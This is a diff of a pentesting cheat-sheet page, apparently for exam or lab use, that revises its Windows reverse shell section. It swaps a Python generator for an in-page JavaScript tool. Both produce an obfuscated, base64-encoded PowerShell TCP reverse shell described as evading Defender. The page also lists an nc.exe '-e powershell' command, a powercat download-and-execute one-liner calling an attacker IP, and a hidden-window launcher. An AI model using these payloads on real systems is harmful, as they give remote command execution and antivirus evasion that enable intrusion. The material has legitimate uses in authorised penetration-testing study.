@@ -84,68 +84,48 @@ perl -e 'exec "/bin/sh";'
 **Windows Reverse Shells**
 - Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
   - Then run `C:\Windows\Temp\nc.exe -e powershell.exe {IP} {port}` for a Powershell reverse shell
-- Can also just do it with powershell alone - use this python script to generate the obfuscated payload (doesn't trip Defender, as of writing):
-  - If you don't want the command window hanging around for whatever reason, the below can be adapted like so: 
+- [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) is a robust Windows reverse shell
+  - Invoked with `IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{port}/powercat.ps1');powercat -c {IP} -p {port} -e powershell`
+  - Very signatured, will trigger EDR
+- Can also just do it with powershell alone - use the below to generate an obfuscated payload (doesn't trip Defender, as of writing):
+  - If you don't want the command window hanging around for whatever reason, the output can be adapted like so: 
     - `if not defined _Z (set _Z=1&start /min cmd /c %~f0&exit) else (powershell -w hidden -exec bypass -enc BASE64HERE &exit)`
       - This will set `_Z=1` on the first run, relaunch the same script minimized, and exit the visible window since `_Z` is now defined
       - Much faster than simply starting the window minimized
 
+**Windows Revshell Generator**
 {% raw %}
-```py
-import base64, sys, random, string
-if len(sys.argv) < 3: print('usage: %s ip port' % sys.argv[0]); sys.exit(0)
-ip, port = sys.argv[1], sys.argv[2]
-UNSAFE = set('ntrabfv0')
-rv = lambda: '$' + ''.join(random.choices(string.ascii_letters, k=random.randint(6,12)))
-rs = lambda: ''.join(random.choices(string.ascii_letters+string.digits, k=random.randint(8,20)))
-ri = lambda: str(random.randint(100,999999))
-def bt(cmd):
-    parts = cmd.split('-')
-    r = []
-    for p in parts:
-        sp = [i for i in range(1,len(p)) if p[i].lower() not in UNSAFE]
-        if sp: i = random.choice(sp); p = p[:i]+'`'+p[i:]
-        r.append(p)
-    return '-'.join(r)
-def ss(s):
-    m = random.randint(2,len(s)-2)
-    return "('%s'+'%s')" % (s[:m],s[m:])
-words = 'initialize setup config validate check process handler module service update refresh sync load parse format convert buffer cache registry session context dispatch render'.split()
-rc = lambda: '# %s %s %s' % (random.choice(words),random.choice(words),rs())
-junk_t = [lambda: '%s = %s'%(rv(),ri()), lambda: "%s = '%s'"%(rv(),rs()),
-           lambda: 'if ($false) { %s = %s }'%(rv(),ri()), rc,
-           lambda: 'function %s { return %s }'%(rs(),ri()),
-           lambda: '%s = [int](%s) + [int](%s)'%(rv(),ri(),ri())]
-jl = lambda n=None: '\n'.join(random.choice(junk_t)() for _ in range(n or random.randint(1,3)))
-vc,vs,vb,vr,vd,vx,ve,vt = rv(),rv(),rv(),rv(),rv(),rv(),rv(),rv()
-payload = f"""{jl(3)}
-{vt} = {ss('System.Net.Sockets.TCPClient')}
-{jl(2)}
-{vc} = {bt('New-Object')} {vt} ('{ip}',{port})
-{jl(1)}
-{vs} = {vc}.GetStream()
-[byte[]]{vb} = 0..65535|%{{0}}
-{jl(2)}
-while(({vr} = {vs}.Read({vb}, 0, {vb}.Length)) -ne 0){{
-    {rc()}
-    {ve} = {bt('New-Object')} -TypeName {ss('System.Text.ASCIIEncoding')}
-    {vd} = {ve}.GetString({vb},0, {vr})
-    {jl(1)}
-    {vx} = (& ([scriptblock]::Create({vd})) 2>&1 | {bt('Out-String')} )
-    {vx} = ([text.encoding]::ASCII).GetBytes({vx} + 'ps> ')
-    {vs}.Write({vx},0,{vx}.Length)
-    {vs}.Flush()
-    {jl(1)}
-}}
-{jl(2)}
-{vc}.Close()
-"""
-b64 = base64.b64encode(payload.encode('utf-16-le'))
-print("powershell -exec bypass -enc %s" % b64.decode())
-
-```
+<input id="rs-ip" placeholder="IP" value="10.10.10.10" size="15" style="font:inherit;padding:1px 5px;border:1px solid #e8e8e8;border-radius:3px"> <input id="rs-port" placeholder="Port" value="4444" size="6" style="font:inherit;padding:1px 5px;border:1px solid #e8e8e8;border-radius:3px"> <button onclick="genRS()" style="font:inherit;padding:1px 8px;border:1px solid #e8e8e8;border-radius:3px;cursor:pointer">Generate</button> <button onclick="navigator.clipboard.writeText(document.getElementById('rs-out').textContent)" style="font:inherit;padding:1px 8px;border:1px solid #e8e8e8;border-radius:3px;cursor:pointer">Copy</button>
+<pre id="rs-out" style="white-space:pre-wrap;word-break:break-all;display:none"></pre>
+<script>
+function genRS(){
+  const UNSAFE=new Set('ntrabfv0'),
+    words='initialize setup config validate check process handler module service update refresh sync load parse format convert buffer cache registry session context dispatch render'.split(' '),
+    az='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',an=az+'0123456789',
+    ri=()=>''+((Math.random()*999899|0)+100),
+    rn=(n,c)=>{let s='';for(let i=0;i<n;i++)s+=c[Math.random()*c.length|0];return s},
+    rv=()=>'$'+rn(6+Math.random()*7|0,az),rs=()=>rn(8+Math.random()*13|0,an),
+    rw=()=>words[Math.random()*words.length|0];
+  function bt(cmd){return cmd.split('-').map(p=>{
+    let sp=[];for(let i=1;i<p.length;i++)if(!UNSAFE.has(p[i].toLowerCase()))sp.push(i);
+    if(sp.length){let i=sp[Math.random()*sp.length|0];p=p.slice(0,i)+'`'+p.slice(i)}return p;
+  }).join('-')}
+  function ss(s){let m=2+Math.random()*(s.length-4)|0;return`('${s.slice(0,m)}'+'${s.slice(m)}')`}
+  const jt=[()=>`${rv()} = ${ri()}`,()=>`${rv()} = '${rs()}'`,()=>`if ($false) { ${rv()} = ${ri()} }`,
+    ()=>`# ${rw()} ${rw()} ${rs()}`,()=>`function ${rs()} { return ${ri()} }`,
+    ()=>`${rv()} = [int](${ri()}) + [int](${ri()})`];
+  function jl(n){n=n||(1+Math.random()*3|0);return Array.from({length:n},()=>jt[Math.random()*jt.length|0]()).join('\n')}
+  const ip=document.getElementById('rs-ip').value,port=document.getElementById('rs-port').value,
+    [vc,vs,vb,vr,vd,vx,ve,vt]=[rv(),rv(),rv(),rv(),rv(),rv(),rv(),rv()],
+    cm=`# ${rw()} ${rw()} ${rs()}`;
+  const payload=`${jl(3)}\n${vt} = ${ss('System.Net.Sockets.TCPClient')}\n${jl(2)}\n${vc} = ${bt('New-Object')} ${vt} ('${ip}',${port})\n${jl(1)}\n${vs} = ${vc}.GetStream()\n[byte[]]${vb} = 0..65535|%{0}\n${jl(2)}\nwhile((${vr} = ${vs}.Read(${vb}, 0, ${vb}.Length)) -ne 0){\n    ${cm}\n    ${ve} = ${bt('New-Object')} -TypeName ${ss('System.Text.ASCIIEncoding')}\n    ${vd} = ${ve}.GetString(${vb},0, ${vr})\n    ${jl(1)}\n    ${vx} = (& ([scriptblock]::Create(${vd})) 2>&1 | ${bt('Out-String')} )\n    ${vx} = ([text.encoding]::ASCII).GetBytes(${vx} + 'ps> ')\n    ${vs}.Write(${vx},0,${vx}.Length)\n    ${vs}.Flush()\n    ${jl(1)}\n}\n${jl(2)}\n${vc}.Close()\n`;
+  const u16=new Uint8Array(payload.length*2);
+  for(let i=0;i<payload.length;i++){const c=payload.charCodeAt(i);u16[i*2]=c&0xff;u16[i*2+1]=c>>8}
+  const out=document.getElementById('rs-out');out.style.display='block';out.textContent='powershell -exec bypass -enc '+btoa(String.fromCharCode(...u16));
+}
+</script>
 {% endraw %}
 
-- Run [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) - `IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{port}/powercat.ps1');powercat -c 192.168.45.220 -p 4444 -e powershell`
+
 
 
